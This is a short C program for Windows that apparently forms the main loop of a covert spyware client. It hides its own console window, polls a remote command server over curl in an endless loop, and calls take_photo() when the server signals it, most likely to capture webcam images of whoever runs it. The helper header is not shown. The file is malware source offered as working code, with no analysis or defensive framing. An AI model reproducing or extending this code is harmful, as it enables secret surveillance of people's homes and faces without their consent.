#include <stdio.h>
#include "sendreq.h"

#define secounds *1000

int main()
{
    AllocConsole();
    HWND stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    curl_global_init(CURL_GLOBAL_ALL);
    const char* urlRecive = IP_PORT "/api/user/" TOKEN "/inbox/new";
    while (1)
    {
        send_request(urlRecive);

        do_take ? take_photo() : Sleep(1 secounds);
        do_take ? take_photo() : Sleep(1 secounds);

        send_request(urlRecive);
        
        do_take ? take_photo() : Sleep(1 secounds);
        do_take ? take_photo() : Sleep(1 secounds);
        
    }
    curl_global_cleanup();
    return 0;
}